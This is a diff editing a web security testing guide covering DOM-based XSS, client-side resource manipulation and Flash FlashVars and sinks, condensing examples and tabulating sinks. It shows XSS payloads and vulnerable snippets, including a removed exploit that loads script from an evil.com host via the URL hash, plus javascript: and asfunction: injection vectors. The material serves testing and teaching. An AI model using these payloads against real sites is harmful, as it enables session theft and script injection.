@@ -33,21 +33,8 @@ Unlike reflected/stored XSS, the malicious data never has to round-trip through 
 document.write("Site is at: " + document.location.href + ".");
 </script>
 ```
-Appending `#<script>alert('xss')</script>` to the URL executes immediately in the browser; the fragment is never transmitted to the server.
+Appending `#<script>alert('xss')</script>` to the URL executes immediately in the browser; the fragment is never transmitted to the server. Exploitability differs by source: server-inserted values depend on server-side filtering, while raw browser objects (`window.location`, etc.) depend on the browser's own encoding.
 
-Server-inserted data vs. client-side objects — both look similar in code but differ in exploitability:
-```js
-var data = "<escaped data from the server>";       // exploitability depends on server-side filtering
-var data2 = window.location;                        // exploitability depends on browser's own encoding of the object
-```
-
-A simple case a scanner might catch (payload reflected in the response):
-```html
-<script>
-var pos=document.URL.indexOf("message=")+5;
-document.write(document.URL.substring(pos,document.URL.length));
-</script>
-```
 A case scanners typically miss (payload never reflected, only conditionally executed):
 ```html
 <script>
@@ -216,16 +203,7 @@ Refs: "Got Your Nose" (Mario Heiderich); Password "cracker" via CSS and HTML5; C
 
 Goal: find user-controlled input that sets the URL of a resource the page loads (script `src`, iframe `src`, XHR target, etc.) — usable to inject malicious script or content, or to redirect a CORS request to an attacker-controlled origin.
 
-```html
-<script>
-var d=document.createElement("script");
-if(location.hash.slice(1)) { d.src = location.hash.slice(1); }
-document.body.appendChild(d);
-</script>
-```
-Exploit: `www.victim.com/#http://evil.com/js.js` — `js.js` executes arbitrary JS (e.g. `alert(document.cookie)`) in the victim's context.
-
-More damaging: controlling the URL of a CORS request whose response is then rendered:
+Most damaging case: controlling the URL of a CORS request whose response is then rendered:
 ```html
 <b id="p"></b>
 <script>
@@ -348,13 +326,14 @@ Developers should only accept relative URLs, or verify the target domain/protoco
 
 **FlashVars**: developer-intended inputs, passed via `<object>`/`<embed>` params or a query string (`file.swf?var1=val1`). In AS3 they must be explicitly read from `LoaderInfo(...).parameters`; in AS2, any undefined global (`_root.x`, `_global.x`, `_level0.x`) is implicitly overwritable by a URL param of the same name — a common source of injectable state, e.g. `_root.language` feeding an XML loader URL: `file.swf?language=http://evil.example.org/malicious.xml?`.
 
-**Unsafe methods** (since Player r47) — grep decompiled code for: `loadVariables()`, `loadMovie()`, `loadMovieNum()`, `getURL()`, `FScrollPane.loadScrollContent()`, `LoadVars.load`/`.send`, `XML.load()`, `Sound.loadSound()`, `NetStream.play()`, `flash.external.ExternalInterface.call()`, `htmlText`.
+Once a FlashVar/undefined global reaches one of these sinks, it's exploitable:
 
-**GetURL (AS2) / NavigateToURL (AS3)** — an undefined variable or FlashVar reaching either can execute JS in the movie's domain: `getURL(_root.URI,'_targetFrame')` exploited via `file.swf?URI=javascript:evilcode`.
-
-**`asfunction` protocol** — pre-r48, could target any URL-accepting method; post-r48, restricted to HTML TextFields. Injectable as `asfunction:getURL,javascript:evilcode` wherever a URL param feeds e.g. `loadMovie(_root.URL)`.
-
-**ExternalInterface.call** — abusable when part of its argument is attacker-controlled (`flash.external.ExternalInterface.call(_root.callback)`), since the browser-side call is effectively `eval('try { __flash__toXML('+__root.callback+') ; } catch...')`.
+| Sink | Vector |
+|---|---|
+| `loadVariables()`, `loadMovie()`, `loadMovieNum()`, `FScrollPane.loadScrollContent()`, `LoadVars.load`/`.send`, `XML.load()`, `Sound.loadSound()`, `NetStream.play()`, `htmlText` | unsafe method reachable since Player r47 — grep decompiled code for these |
+| `getURL()` (AS2) / `NavigateToURL` (AS3) | JS execution via `getURL(_root.URI,'_targetFrame')` ← `file.swf?URI=javascript:evilcode` |
+| `asfunction:` protocol | pre-r48 could target any URL-accepting method, post-r48 restricted to HTML TextFields — `asfunction:getURL,javascript:evilcode` wherever a URL param feeds e.g. `loadMovie(_root.URL)` |
+| `flash.external.ExternalInterface.call()` | abusable when part of its argument is attacker-controlled (`ExternalInterface.call(_root.callback)`) — browser-side call is effectively `eval('try { __flash__toXML('+__root.callback+') ; } catch...')` |
 
 **HTML Injection in TextFields** — setting `tf.html = true; tf.htmlText = '<tag>text</tag>'` with attacker-controlled content allows injecting `<a>`/`<img>` tags:
 ```
